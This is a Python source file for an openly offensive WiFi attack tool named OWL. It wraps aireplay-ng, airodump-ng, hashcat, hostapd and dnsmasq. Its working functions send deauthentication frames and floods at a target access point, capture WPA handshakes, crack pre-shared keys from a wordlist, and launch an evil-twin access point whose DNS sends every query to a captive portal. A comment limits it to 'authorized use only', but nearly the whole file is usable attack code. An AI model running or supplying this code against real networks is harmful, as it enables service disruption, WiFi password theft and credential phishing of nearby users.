"""
╔══════════════════════════════════════════════════════════════╗
║  OWL — Offensive WiFi Launcher                               ║
║  Live Mode Engine — Real hardware backend                    ║
║  Created by Sharon Anil                                      ║
╚══════════════════════════════════════════════════════════════╝

Wraps real Linux wireless tools: airmon-ng, aireplay-ng,
airodump-ng, hostapd, dnsmasq, hashcat, aircrack-ng.
All ops are guarded by platform + privilege checks.
"""

from __future__ import annotations
import asyncio
import os
import platform
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import AsyncIterator, Callable

# ─── Platform guards ─────────────────────────────────────────────────────────

IS_LINUX   = platform.system() == "Linux"
IS_ROOT    = (os.geteuid() == 0) if IS_LINUX else False
TOOLS = [
    "airmon-ng", "aireplay-ng", "airodump-ng",
    "iwconfig", "iw", "ip",
]
OPTIONAL_TOOLS = ["hashcat", "aircrack-ng", "hostapd", "dnsmasq", "hcxdumptool"]


def check_live_available() -> dict:
    """Return dict of tool availability."""
    result = {
        "platform_ok": IS_LINUX,
        "root_ok": IS_ROOT,
        "tools": {},
        "optional": {},
        "live_ready": False,
    }
    for t in TOOLS:
        result["tools"][t] = shutil.which(t) is not None
    for t in OPTIONAL_TOOLS:
        result["optional"][t] = shutil.which(t) is not None
    result["live_ready"] = (
        IS_LINUX and IS_ROOT and all(result["tools"].values())
    )
    return result


def get_wireless_interfaces() -> list[str]:
    """List available wireless interfaces."""
    if not IS_LINUX:
        return []
    try:
        out = subprocess.check_output(
            ["iw", "dev"], stderr=subprocess.DEVNULL, text=True
        )
        ifaces = []
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("Interface "):
                ifaces.append(line.split()[-1])
        return ifaces
    except Exception:
        return []


def get_interface_mode(iface: str) -> str:
    """Return monitor / managed / unknown."""
    if not IS_LINUX:
        return "unknown"
    try:
        out = subprocess.check_output(
            ["iw", "dev", iface, "info"],
            stderr=subprocess.DEVNULL, text=True
        )
        for line in out.splitlines():
            if "type" in line.lower():
                return line.strip().split()[-1]
        return "unknown"
    except Exception:
        return "unknown"


# ─── Monitor mode helpers ────────────────────────────────────────────────────

async def enable_monitor_mode(
    iface: str, callback: Callable[[str, str], None]
) -> str | None:
    """Enable monitor mode. Returns monitor interface name or None."""
    if not IS_LINUX or not IS_ROOT:
        callback("warn", f"[!] Live mode not available (need Linux + root).")
        return None
    callback("cyan", f"[*] Killing conflicting processes via airmon-ng check kill...")
    await _run_cmd(["airmon-ng", "check", "kill"], callback)
    callback("cyan", f"[*] Enabling monitor mode on {iface}...")
    await _run_cmd(["airmon-ng", "start", iface], callback)
    mon = iface + "mon"
    if shutil.which("iw"):
        ifaces = get_wireless_interfaces()
        # find mon interface
        for i in ifaces:
            if get_interface_mode(i) == "monitor":
                mon = i
                break
    callback("green", f"[+] Monitor mode active on {mon}")
    return mon


async def disable_monitor_mode(
    iface: str, callback: Callable[[str, str], None]
) -> None:
    """Restore managed mode."""
    if not IS_LINUX or not IS_ROOT:
        return
    callback("cyan", f"[*] Stopping monitor mode on {iface}...")
    await _run_cmd(["airmon-ng", "stop", iface], callback)
    callback("green", f"[+] Interface restored to managed mode.")
    # Restart NetworkManager if present
    if shutil.which("systemctl"):
        await _run_cmd(
            ["systemctl", "restart", "NetworkManager"],
            callback, ignore_errors=True
        )
        callback("green", "[+] NetworkManager restarted.")


# ─── RECON ───────────────────────────────────────────────────────────────────

async def live_airodump_scan(
    iface: str,
    duration: int,
    callback: Callable[[str, str], None],
    output_prefix: str = "/tmp/owl_recon"
) -> Path | None:
    """Run airodump-ng scan and return CSV path."""
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live scan requires Linux + root.")
        return None

    csv_path = Path(f"{output_prefix}-01.csv")
    cmd = [
        "airodump-ng",
        "--output-format", "csv",
        "--write", output_prefix,
        "--write-interval", "1",
        iface,
    ]
    callback("cyan", f"[*] Running airodump-ng for {duration}s...")
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await asyncio.sleep(duration)
        proc.terminate()
        await proc.wait()
        if csv_path.exists():
            callback("green", f"[+] Scan complete. CSV: {csv_path}")
            return csv_path
        else:
            callback("error", "[✗] No CSV output from airodump-ng.")
            return None
    except Exception as e:
        callback("error", f"[✗] airodump-ng error: {e}")
        return None


def parse_airodump_csv(csv_path: Path) -> tuple[list[dict], list[dict]]:
    """Parse airodump-ng CSV into (aps, clients)."""
    aps: list[dict] = []
    clients: list[dict] = []
    try:
        text = csv_path.read_text(errors="replace")
        sections = text.split("\r\n\r\n")
        ap_section = sections[0] if sections else ""
        cl_section = sections[1] if len(sections) > 1 else ""

        ap_lines = ap_section.strip().splitlines()
        if len(ap_lines) > 1:
            for line in ap_lines[2:]:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14:
                    aps.append({
                        "bssid":   parts[0],
                        "channel": parts[3].strip(),
                        "signal":  parts[8].strip() + " dBm",
                        "enc":     parts[5].strip(),
                        "ssid":    parts[13].strip(),
                        "pmf":     "Unknown",
                        "clients": 0,
                        "wids":    False,
                        "vendor":  "",
                    })

        cl_lines = cl_section.strip().splitlines()
        if len(cl_lines) > 1:
            for line in cl_lines[2:]:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 6:
                    clients.append({
                        "mac":       parts[0],
                        "bssid":     parts[5],
                        "signal":    parts[3].strip() + " dBm",
                        "channel":   "—",
                        "vendor":    "",
                        "frames":    parts[4].strip(),
                        "last_seen": parts[2].strip(),
                    })
    except Exception:
        pass
    return aps, clients


# ─── DEAUTH ──────────────────────────────────────────────────────────────────

async def live_deauth(
    iface: str,
    bssid: str,
    client: str,
    count: int,
    reason: str,
    callback: Callable[[str, str], None],
) -> None:
    """Send real deauth frames via aireplay-ng."""
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live deauth requires Linux + root.")
        return

    reason_int = int(reason, 16) if reason.startswith("0x") else int(reason)
    cmd = [
        "aireplay-ng",
        "--deauth", str(count),
        "-a", bssid,
        "--reason", str(reason_int),
    ]
    if client and client not in ("FF:FF:FF:FF:FF:FF", "", "broadcast"):
        cmd += ["-c", client]
    cmd.append(iface)

    callback("cyan", f"[*] Running: {' '.join(cmd)}")
    await _run_cmd(cmd, callback)


# ─── FLOOD ───────────────────────────────────────────────────────────────────

async def live_flood(
    iface: str,
    bssid: str,
    total: int,
    burst: int,
    callback: Callable[[str, str], None],
    stop_event: asyncio.Event | None = None,
) -> None:
    """Flood using repeated aireplay-ng -0 calls."""
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live flood requires Linux + root.")
        return

    sent = 0
    while True:
        if stop_event and stop_event.is_set():
            break
        if total > 0 and sent >= total:
            break
        batch = min(burst, total - sent) if total > 0 else burst
        cmd = [
            "aireplay-ng", "--deauth", str(batch),
            "-a", bssid, iface
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        sent += batch
        callback("magenta", f"[FLOOD] Sent {sent} frames to {bssid}")
        await asyncio.sleep(0.1)

    callback("red", f"[!!!] FLOOD COMPLETE — {sent} frames sent.")


# ─── HARVEST ─────────────────────────────────────────────────────────────────

async def live_harvest(
    iface: str,
    bssid: str,
    channel: int,
    output_dir: str,
    callback: Callable[[str, str], None],
    stop_event: asyncio.Event | None = None,
) -> Path | None:
    """Capture handshake via airodump-ng on specific channel/BSSID."""
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Live harvest requires Linux + root.")
        return None

    Path(output_dir).mkdir(parents=True, exist_ok=True)
    prefix = str(Path(output_dir) / f"owl_cap_{bssid.replace(':', '')}")
    cmd = [
        "airodump-ng",
        "-c", str(channel),
        "--bssid", bssid,
        "--output-format", "pcap,csv",
        "--write", prefix,
        iface,
    ]
    callback("cyan", f"[*] Starting handshake capture on ch{channel}, target {bssid}")
    callback("cyan", f"[*] Output: {prefix}.*")

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )

    # Wait until stop or pcap appears with EAPOL
    cap_path = Path(prefix + "-01.cap")
    timeout = 300  # 5 min max
    elapsed = 0
    while elapsed < timeout:
        if stop_event and stop_event.is_set():
            break
        if cap_path.exists() and cap_path.stat().st_size > 1024:
            callback("green", "[+] Capture file growing — checking for handshake...")
            # Check with aircrack-ng
            r = subprocess.run(
                ["aircrack-ng", str(cap_path)],
                capture_output=True, text=True
            )
            if "WPA" in r.stdout and "handshake" in r.stdout.lower():
                callback("green", "[✓] 4-WAY HANDSHAKE CAPTURED!")
                proc.terminate()
                return cap_path
        await asyncio.sleep(3)
        elapsed += 3

    proc.terminate()
    await proc.wait()
    if cap_path.exists():
        callback("yellow", f"[!] Capture stopped. File: {cap_path}")
        return cap_path
    return None


async def live_crack_hashcat(
    cap_file: str,
    wordlist: str,
    callback: Callable[[str, str], None],
) -> str | None:
    """Crack captured handshake with hashcat."""
    if not shutil.which("hashcat"):
        callback("warn", "[!] hashcat not found. Install: sudo apt install hashcat")
        return None

    # Convert to hccapx if needed
    hc_file = cap_file.replace(".cap", ".hccapx")
    if shutil.which("hcxtools") or shutil.which("cap2hccapx"):
        tool = "cap2hccapx" if shutil.which("cap2hccapx") else "hcxtools"
        subprocess.run([tool, cap_file, hc_file], capture_output=True)

    target = hc_file if Path(hc_file).exists() else cap_file
    cmd = [
        "hashcat", "-m", "22000",
        target, wordlist,
        "--force", "--status", "--status-timer=5",
    ]
    callback("cyan", f"[*] Running hashcat on {target}...")
    psk = None
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    async for line in proc.stdout:
        line = line.decode(errors="replace").rstrip()
        if ":" in line and len(line.split(":")) > 4:
            psk = line.split(":")[-1].strip()
            callback("green", f"[✓] PSK CRACKED: \"{psk}\"")
            break
        elif "Progress" in line or "Speed" in line:
            callback("cyan", f"[*] {line.strip()}")
        elif "Exhausted" in line:
            callback("yellow", "[!] Wordlist exhausted — no PSK found.")
    await proc.wait()
    return psk


# ─── PORTAL ──────────────────────────────────────────────────────────────────

def generate_hostapd_conf(
    iface: str, ssid: str, channel: int = 6
) -> str:
    """Generate hostapd config for evil twin AP."""
    return f"""# OWL-PORTAL — hostapd config
# Created by Sharon Anil — For authorized use only.

interface={iface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wmm_enabled=0
"""


def generate_dnsmasq_conf(
    iface: str,
    gateway: str = "192.168.99.1",
    dhcp_start: str = "192.168.99.100",
    dhcp_end: str = "192.168.99.200",
    portal_ip: str = "192.168.99.1",
) -> str:
    """Generate dnsmasq config for captive portal redirect."""
    return f"""# OWL-PORTAL — dnsmasq config
interface={iface}
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{gateway}
dhcp-option=6,{gateway}
server=8.8.8.8
log-queries
log-dhcp
listen-address={gateway}
bind-dynamic
address=/#/{portal_ip}
"""


async def start_evil_twin(
    iface: str,
    ssid: str,
    channel: int,
    callback: Callable[[str, str], None],
) -> list[asyncio.subprocess.Process]:
    """Start hostapd + dnsmasq for evil twin."""
    procs: list[asyncio.subprocess.Process] = []
    if not IS_LINUX or not IS_ROOT:
        callback("warn", "[!] Evil twin requires Linux + root.")
        return procs

    # Write configs
    hostapd_conf = "/tmp/owl_hostapd.conf"
    dnsmasq_conf = "/tmp/owl_dnsmasq.conf"
    Path(hostapd_conf).write_text(generate_hostapd_conf(iface, ssid, channel))
    Path(dnsmasq_conf).write_text(generate_dnsmasq_conf(iface))

    # Assign IP to interface
    await _run_cmd(["ip", "addr", "flush", "dev", iface], callback, ignore_errors=True)
    await _run_cmd(["ip", "addr", "add", "192.168.99.1/24", "dev", iface], callback)
    await _run_cmd(["ip", "link", "set", iface, "up"], callback)

    callback("cyan", f"[*] Starting hostapd on {iface} — SSID: {ssid}")
    p1 = await asyncio.create_subprocess_exec(
        "hostapd", hostapd_conf,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    procs.append(p1)
    await asyncio.sleep(1)

    callback("cyan", "[*] Starting dnsmasq (DHCP + DNS spoof)...")
    p2 = await asyncio.create_subprocess_exec(
        "dnsmasq", "-C", dnsmasq_conf, "--no-daemon",
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    procs.append(p2)

    callback("green", f"[+] Evil twin LIVE: SSID=\"{ssid}\" on {iface} ch{channel}")
    callback("green", "[+] DHCP pool: 192.168.99.100 - 200")
    callback("green", "[+] DNS spoof: all queries → 192.168.99.1")
    return procs


# ─── Internal helpers ─────────────────────────────────────────────────────────

async def _run_cmd(
    cmd: list[str],
    callback: Callable[[str, str], None],
    ignore_errors: bool = False,
) -> int:
    """Run a command, stream output to callback."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for raw in proc.stdout:
            line = raw.decode(errors="replace").rstrip()
            if line:
                callback("dim", f"    {line}")
        rc = await proc.wait()
        if rc != 0 and not ignore_errors:
            callback("error", f"[✗] Command exited {rc}: {' '.join(cmd)}")
        return rc
    except FileNotFoundError:
        callback("error", f"[✗] Tool not found: {cmd[0]}")
        return 127
    except Exception as e:
        callback("error", f"[✗] Exception: {e}")
        return 1


# ─── Evidence export ──────────────────────────────────────────────────────────

def export_evidence(state: dict, export_dir: str) -> str:
    """Export session log + captures to timestamped directory."""
    from datetime import datetime
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = Path(export_dir) / f"owl_evidence_{ts}"
    out.mkdir(parents=True, exist_ok=True)

    # Write session log
    log_path = out / "sessions.json"
    import json
    log_path.write_text(json.dumps(state.get("sessions", []), indent=2))

    # Write captures list
    cap_path = out / "captures.json"
    cap_path.write_text(json.dumps(state.get("captures", []), indent=2))

    return str(out)
